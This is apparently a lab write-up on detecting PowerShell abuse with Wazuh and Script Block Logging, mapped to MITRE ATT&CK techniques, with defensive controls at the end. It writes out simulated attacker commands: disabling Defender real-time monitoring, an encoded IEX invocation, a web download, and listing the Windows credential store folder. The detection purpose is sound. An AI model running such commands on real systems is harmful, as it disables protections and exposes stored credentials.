# Attack 05 — PowerShell Abuse Detection

**MITRE ATT&CK:** T1059.001 (PowerShell) | T1105 (Ingress Tool Transfer) | T1562.001 (Disable Defender)
**Tool:** Windows PowerShell
**Event ID:** 4104 (Script Block Logging) | 5001 (Defender Real-time disabled)
**Performed on:** Windows 10 Victim Machine

---

## Objective

Simulate common attacker PowerShell techniques and demonstrate that Wazuh detects every command —
including obfuscated/encoded ones — once Script Block Logging is enabled.

PowerShell is the most abused built-in tool in Windows. Attackers use it because:
- It's trusted by the OS
- It can download files, execute code in memory, and bypass many security controls
- It was historically not logged at all

---

## Step 0 — Enable Script Block Logging

This must be enabled on the Windows machine for PowerShell commands to appear in Wazuh.

```powershell
# Enable PowerShell Script Block Logging
reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
  /v EnableScriptBlockLogging /t REG_DWORD /d 1
```

Or via Group Policy:
```
Computer Configuration → Administrative Templates →
Windows Components → Windows PowerShell →
Turn on PowerShell Script Block Logging → Enabled
```

Once enabled, every PowerShell command generates **Event ID 4104** in:
`Microsoft-Windows-PowerShell/Operational`

---

## Commands Used

### Simulation 1 — External Download (Ingress Tool Transfer)

```powershell
Invoke-WebRequest http://example.com
```

**What this simulates:** An attacker downloading a tool or payload from an external server.
In real attacks this is used to pull Mimikatz, reverse shells, or C2 agents.

**MITRE:** T1105 — Ingress Tool Transfer

---

### Simulation 2 — Process Enumeration (Reconnaissance)

```powershell
Get-Process
```

**What this simulates:** Attacker listing running processes to find:
- Security tools (AV, EDR) to avoid
- Sensitive applications (password managers, browsers) to target

**MITRE:** T1057 — Process Discovery

---

### Simulation 3 — Disable Windows Defender (Defense Evasion)

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

**What this simulates:** Disabling real-time antivirus protection before dropping malware.
This is one of the first things many malware samples do automatically.

**Generates:**
- Event ID 5001 — Windows Defender Real-time Protection disabled

**MITRE:** T1562.001 — Impair Defenses: Disable or Modify Tools

---

### Simulation 4 — Obfuscated Encoded Command (Evasion)

```powershell
powershell -enc SQBFAFgA
```

**What this does:** `-enc` accepts a Base64-encoded command and executes it.
Decoded, `SQBFAFgA` = `IEX` (Invoke-Expression — used to execute downloaded code).

**Why attackers use this:**
- Bypasses simple keyword-based detection ("IEX" appears nowhere in plain text)
- Common in commodity malware and phishing payloads

**Wazuh detection:** Script Block Logging decodes the command before logging.
Even encoded commands appear in plaintext in Event ID 4104.

---

### Simulation 5 — Credential-Targeting Behavior

```powershell
# Access credential store location (read-only test)
Get-ChildItem "C:\Users\Administrator\AppData\Local\Microsoft\Credentials"
```

**MITRE:** T1555 — Credentials from Password Stores

---

## What Happens in Windows Event Logs

### Event ID 4104 — Script Block Logging

```
Event ID:     4104
Log:          Microsoft-Windows-PowerShell/Operational
Description:  Creating Scriptblock text

ScriptBlock Text:
  Invoke-WebRequest http://example.com

Path:         (none — interactive execution)
UserID:       WIN10\Administrator
```

Every command — including encoded ones — is captured here in decoded form.

---

## Wazuh Detection

**Where to look:**
1. Wazuh Dashboard → Security Events
2. Search: `powershell`
3. Search: `4104`
4. Search: `Invoke-WebRequest` or `Set-MpPreference`

**What Wazuh shows:**
- Full decoded PowerShell command text
- User who executed it
- Timestamp
- MITRE tag: T1059.001

**Defender alert (Event ID 5001) — search in Wazuh:**
- `5001` or `defender` or `T1562`

---

## Re-enable Defender After Lab

```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
```

---

## Defensive Notes

| Control | Effect |
|---|---|
| Enable Script Block Logging | Captures every PowerShell command — even obfuscated |
| Enable Module Logging | Logs all PowerShell modules loaded |
| PowerShell Constrained Language Mode | Restricts PowerShell to safe cmdlets only |
| AMSI (Antimalware Scan Interface) | Scans PowerShell before execution (enabled by default in Win 10) |
| Application allowlisting (AppLocker) | Blocks unsigned PowerShell scripts |
| Monitor Event 5001 | Alert immediately when Defender is disabled |
| Disable PowerShell v2 | PowerShell v2 bypasses many modern logging controls |

```powershell
# Disable PowerShell v2 (removes logging bypass)
Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
```
